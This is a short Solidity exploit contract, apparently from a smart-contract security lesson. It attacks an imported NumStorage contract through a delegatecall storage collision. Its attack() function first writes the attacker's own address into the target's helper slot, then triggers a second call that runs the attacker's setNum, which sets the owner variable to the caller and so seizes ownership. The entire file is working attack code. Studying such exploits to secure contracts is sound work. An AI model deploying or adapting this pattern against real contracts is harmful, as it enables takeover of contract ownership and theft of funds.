// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./NumStorage.sol";

contract NumStorageAttack {
    address public helper;
    address public owner;
    uint256 public num;

    NumStorage public numStorage;

    constructor(NumStorage _numStorage) {
        numStorage = _numStorage;
    }

    // Function to use when the Attack contract becomes the Helper called by NumStorage Contract
    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        numStorage.setNum(uint256(uint160(address(this))));
        numStorage.setNum(1);
    }
}